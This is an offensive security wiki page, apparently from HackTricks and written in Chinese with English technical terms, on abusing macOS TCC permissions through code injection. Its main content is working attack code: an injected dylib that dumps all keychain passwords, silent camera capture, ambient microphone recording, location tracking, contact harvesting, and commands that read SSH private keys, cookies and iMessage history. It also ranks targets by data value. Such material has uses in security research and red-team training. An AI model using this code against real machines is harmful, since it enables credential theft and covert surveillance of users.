# 通过 TCC Permissions 窃取 macOS 凭据和数据

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

macOS TCC（Transparency, Consent, and Control）保护对敏感用户数据的访问。当攻击者**攻陷一个已经获得 TCC grants 的 binary**时，就会继承这些 permissions。本页面记录了每项与数据窃取相关的 TCC permission 的 exploitation potential。<sup>[[2]](#references)</sup>

> [!WARNING]
> 通过 DYLD injection、dylib hijacking 或 task port 向一个已获 TCC grant 的 binary 注入 code，会**静默继承其所有 TCC permissions**。同一 process 读取受保护数据时，不会出现额外的 prompt 或 verification。<sup>[[4]](#references)</sup>

---

## Keychain Access Groups

### 目标

macOS Keychain 存储：
- **Wi-Fi passwords** — 所有已保存的 wireless network credentials
- **Website passwords** — Safari、Chrome（使用 Keychain 时）以及其他 browser passwords
- **Application passwords** — email accounts、VPN credentials、development tokens
- **Certificates and private keys** — code signing、client TLS、S/MIME encryption
- **Secure notes** — 用户存储的 secrets

### Entitlement：`keychain-access-groups`

Keychain items 按 **access groups** 组织。应用的 `keychain-access-groups` entitlement 会列出它可以访问的 groups：<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### 代码注入 → Keychain 窃取
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## 摄像头访问（kTCCServiceCamera）

### 利用

具有摄像头 TCC 授权（通过 `kTCCServiceCamera` 或 `com.apple.security.device.camera` entitlement）的二进制文件可以拍摄照片和视频：
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### 静默捕获
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> 从 **macOS Sonoma** 开始，菜单栏中的摄像头指示器会持续显示，无法通过程序隐藏。在较旧版本的 **macOS** 中，短暂的捕获可能不会产生明显的指示器。

---

## 麦克风访问（kTCCServiceMicrophone）

### Exploitation

麦克风访问会捕获内置麦克风、耳机或已连接音频输入设备的所有音频：
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### 攻击：Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 位置跟踪（kTCCServiceLocation）

### 利用
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 持续跟踪
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 联系人 / 日历 / 照片

### 个人数据外泄

| TCC 服务 | Framework | 数据 |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 姓名、电子邮件、电话号码、地址 |
| `kTCCServiceCalendar` | `EventKit` | 会议、参会者、地点 |
| `kTCCServicePhotos` | `Photos.framework` | 照片、屏幕截图、位置元数据 |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 联系人收集
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud 帐户访问

### Entitlement: `com.apple.private.icloud-account-access`

此 Entitlement 允许与 `com.apple.iCloudHelper` XPC service 通信，从而访问：
- **iCloud tokens** — 用户 Apple ID 的身份验证 tokens
- **iCloud Drive** — 来自所有设备的同步文档
- **iCloud Keychain** — 在所有 Apple 设备之间同步的密码
- **Find My** — 用户所有 Apple 设备的位置<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromising an iCloud-entitled binary can extend the attack from a **single device to the entire Apple ecosystem**: other Macs, iPhones, iPads, and Apple Watch. iCloud Keychain sync means passwords from all devices are accessible.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### The Most Powerful TCC Permission

Full Disk Access grants read capability to **every file on the system**, including:
- Other apps' data (Messages, Mail, Safari history)
- TCC databases (revealing all other permissions)
- SSH keys and configuration
- Browser cookies and session tokens
- Application databases and caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

评估可注入的 TCC 授权二进制文件时，应根据数据价值确定优先级：

| 优先级 | TCC 权限 | 原因 |
|---|---|---|
| **Critical** | Full Disk Access | 可访问所有内容 |
| **Critical** | TCC Manager | 可授予任意权限 |
| **High** | Keychain Access Groups | 所有已存储的密码 |
| **High** | iCloud Account Access | 多设备 compromise |
| **High** | Input Monitoring (ListenEvent) | 键盘记录 |
| **High** | Accessibility | GUI 控制、自我授权 |
| **Medium** | Screen Capture | 捕获视觉数据 |
| **Medium** | Camera + Microphone | 监控 |
| **Medium** | Contacts + Calendar | 社会工程数据 |
| **Low** | Location | 实体位置跟踪 |
| **Low** | Photos | 个人数据 |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "在你的 Mac 上发生的事，会留在 Apple 的 iCloud 上吗？！"（Wojciech Regula）](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
